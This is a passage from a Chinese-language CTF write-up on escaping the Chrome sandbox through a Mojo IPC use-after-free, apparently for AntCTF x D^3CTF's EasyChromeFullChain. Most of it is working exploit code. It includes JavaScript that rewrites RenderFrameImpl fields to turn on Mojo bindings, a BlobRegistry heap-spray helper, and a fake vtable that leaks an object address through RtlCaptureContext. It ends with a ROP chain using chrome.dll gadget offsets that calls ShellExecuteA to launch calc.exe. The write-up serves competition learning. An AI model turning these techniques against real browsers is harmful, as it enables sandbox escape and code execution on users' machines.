@@ -1,0 +1,176 @@
+       while (begin_ptr != 0n) {
+          var render_frame_ptr = read64(begin_ptr + 0x28n);
+          console.log("render_frame_ptr=0x" + render_frame_ptr.toString(16));
+          var enabled_bindings_addr = render_frame_ptr + 0x5acn;
+          console.log("enabled_bindings_addr=0x" + enabled_bindings_addr.toString(16));
+          write32(enabled_bindings_addr,2);
+          var is_main_frame_addr = render_frame_ptr + 0xc8n;
+          console.log("is_main_frame_addr=0x" + is_main_frame_addr.toString(16));
+          write8(is_main_frame_addr,1);
+          begin_ptr = read64(begin_ptr + 0x8n);
+       }
+       resetBacking_store();
+       return true;
+    }
+###  泄露RenderFrameImpl对象地址
+制造UAF比较简单，然后我们可以利用`mojo`自带的`BlobRegistry`对象进行`heap
+spray`将数据布局，伪造好`render_frame_host_`的虚表，利用`BlobRegistry`进行`heap
+spray`的方法已经被国外大佬封装为函数，几乎可以在`Mojo`这一类UAF中统一使用。
+    function getAllocationConstructor() {
+       let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+       Mojo.bindInterface(blink.mojom.BlobRegistry.name,mojo.makeRequest(blob_registry_ptr).handle, "process", true);
+       function Allocation(size=280) {
+          function ProgressClient(allocate) {
+             function ProgressClientImpl() {
+             }
+             ProgressClientImpl.prototype = {
+                onProgress: async (arg0) => {
+                   if (this.allocate.writePromise) {
+                      this.allocate.writePromise.resolve(arg0);
+                   }
+                }
+             }
+             this.allocate = allocate;
+             this.ptr = new mojo.AssociatedInterfacePtrInfo();
+             var progress_client_req = mojo.makeRequest(this.ptr);
+             this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);
+             return this;
+          }
+          this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
+          this.progressClient = new ProgressClient(this);
+          blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
+             this.serialized_blob = res.blob;
+          });
+          this.malloc = async function(data) {
+             promise = new Promise((resolve, reject) => {
+                this.writePromise = {resolve: resolve, reject: reject};
+             });
+             this.pipe.producer.writeData(data);
+             this.pipe.producer.close();
+             written = await promise;
+             console.assert(written == data.byteLength);
+          }
+          this.free = async function() {
+             await this.serialized_blob.blob.ptr.reset();
+          }
+          this.read = function(offset, length) {
+             this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
+             this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
+             return new Promise((resolve) => {
+                this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
+                   result = new ArrayBuffer(length);
+                   this.readpipe.consumer.readData(result);
+                   this.watcher.cancel();
+                   resolve(result);
+                });
+             });
+          }
+          this.readQword = async function(offset) {
+             let res = await this.read(offset, 8);
+             return (new DataView(res)).getBigUint64(0, true);
+          }
+          return this;
+       }
+       async function allocate(data) {
+          let allocation = new Allocation(data.byteLength);
+          await allocation.malloc(data);
+          return allocation;
+       }
+       return allocate;
+    }
+为了泄露`RenderFrameImpl`对象地址，我们可以将`GetFrameDepth`函数伪造为某一类特殊函数，首先能够正常被调用且返回，其次可以往我们能够控制的地方写入一些对象地址。一个在CFG绕过中的思想就可以用到这里了，我们将`GetFrameDepth`函数指针伪造为`RtlCaptureContext`，
+    0:000> r
+    rax=00007ff87c342190 rbx=000000006b00c513 rcx=0000022c35d045e0
+    rdx=0000004b4c3fe140 rsi=0000022c365f2e30 rdi=0000004b4c3fe140
+    rip=00007ff874e2c47b rsp=0000004b4c3fe070 rbp=0000000000000002
+     r8=0000000000000000  r9=0000000000000000 r10=0000000000008000
+    r11=0000004b4c3fdfc0 r12=0000022c365677c0 r13=0000004b4c3fe7c0
+    r14=0000022c365f2e30 r15=0000000000000000
+    iopl=0         nv up ei pl nz na po nc
+    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+    chrome!ovly_debug_event+0x1039e9b:
+    00007ff8`74e2c47b ff90c8000000    call    qword ptr [rax+0C8h]
+注意到此时`rcx`指向的就是`RenderFrameImpl`对象地址，我们想要泄露的就是这个值，我们看一下`RtlCaptureContext`的代码
+    .text:00000001800A0D10                 pushfq
+    .text:00000001800A0D12                 mov     [rcx+78h], rax
+    .text:00000001800A0D16                 mov     [rcx+80h], rcx
+    .text:00000001800A0D1D                 mov     [rcx+88h], rdx
+    .text:00000001800A0D24                 mov     [rcx+0B8h], r8
+    .text:00000001800A0D2B                 mov     [rcx+0C0h], r9
+    ...........................
+一句`mov [rcx+80h],
+rcx`将`rcx`的值保存到了`RenderFrameImpl`对象内部，然后我们使用`BlobRegistry`对象将该处的数据读取出来就可以得到地址了。官方WP的做法也是这个原理，只不过他使用的是`content::WebContentsImpl::GetWakeLockContext`这个函数。所以，我们可以将虚表指针伪造为IAT表地址，使得`call
+qword ptr [rax+0C8h]`正好调用到`RtlCaptureContext`，然后我们将数据读出。
+         //伪造RenderFrameHost对象
+          const fakeRFH = new BigUint64Array(RenderFrameHost_SIZE / 8).fill(0x4141414141414141n);
+          //vtable
+          fakeRFH[0] = RtlCaptureContext_iat - 0xc8n;
+          //heap spray
+          for (var i=0;i<spray_count;i++) {
+             spray_arr.push(await allocate(fakeRFH.buffer));
+          }
+          //call RtlCaptureContext
+          await antNestPtr.store("")
+          //now leak the address
+          var rfh_addr = -1;
+          //var allocation;
+          for (var i=0;i<spray_count;i++) {
+             allocation = spray_arr[i];
+             var x = await allocation.readQword(0x80);
+             if (x != 0x4141414141414141n) {
+                rfh_addr = x;
+                break;
+             }
+          }
+          if (rfh_addr == -1) {
+             return false;
+          }
+###  ROP
+现在，准备工作都做好了，那么就可以直接进行ROP了
+          //释放blob，重新heap spray
+          await allocation.free();
+          console.log("rfh_addr=0x" + rfh_addr.toString(16));
+          //0x00000001814fbfae : xchg rax, rsp ; ret
+          var xchg_rax_rsp = chrome_dll_base + 0x14fbfaen;
+          //0x00000001850caadf : mov rax, qword ptr [rcx + 0x10] ; add rcx, 0x10 ; call qword ptr [rax + 0x158]
+          var adjust_register = chrome_dll_base + 0x50caadfn;
+          //0x0000000184ebc82f : add rsp, 0x158 ; ret
+          var add_rsp_158 = chrome_dll_base + 0x4ebc82fn;
+          var shellExecuteA = chrome_dll_base + 0x3FA9C0Fn;
+          var pop_rsi = chrome_dll_base + 0x13b8n;
+          fakeRFH.fill(0n);
+          //fake
+          fakeRFH[0] = rfh_addr;
+          fakeRFH[0x10 / 0x8] = rfh_addr + 0x18n;
+          fakeRFH[0x18 / 0x8] = add_rsp_158;
+          fakeRFH[0xc8 / 0x8] = adjust_register;
+          fakeRFH[0x170 / 0x8] = xchg_rax_rsp;
+          //now rop
+          fakeRFH[0x178 / 0x8] = pop_rsi;
+          fakeRFH[0x180 / 0x8] = rfh_addr + 0x1c0n;
+          fakeRFH[0x188 / 0x8] = shellExecuteA;
+          fakeRFH[0x1b0 / 0x8] = 0n;
+          fakeRFH[0x1b8 / 0x8] = 0x3n;
+          //cmd
+          var cmd = "calc.exe\x00";
+          var cmd_buf = new Uint8Array(fakeRFH.buffer);
+          for (var i=0;i<cmd.length;i++) {
+             cmd_buf[0x1c0 + i] = cmd.charCodeAt(i);
+          }
+          //heap spray
+          for (var i=0;i<spray_count;i++) {
+             await allocate(fakeRFH.buffer);
+          }
+          //run
+          await antNestPtr.store("");
+效果如下
+## 0x04 感想
+Chrome沙箱逃逸这一块做起来还是不错的，也没那么难。通过学习，收获了许多。
+## 0x05 参考
+[chromium 之 ipc (mojo)
+消息机制](https://blog.csdn.net/dangwei_90/article/details/110407234)  
+[Mojo docs (go/mojo-docs)](https://chromium.googlesource.com/chromium/src/+/master/mojo/README.md)  
+[SCTF2020-EasyMojo](https://github.com/SycloverSecurity/SCTF2020/tree/master/Pwn/EasyMojo)  
+[利用 Mojo IPC 的 UAF 漏洞逃逸 Chrome 浏览器沙箱](https://www.4hou.com/posts/vD2V)  
+[90分钟加时依然无解 | AntCTF x D^3CTF [EasyChromeFullChain]
+Writeup](https://mp.weixin.qq.com/s/Gfo3GAoSyK50jFqOKCHKVA)
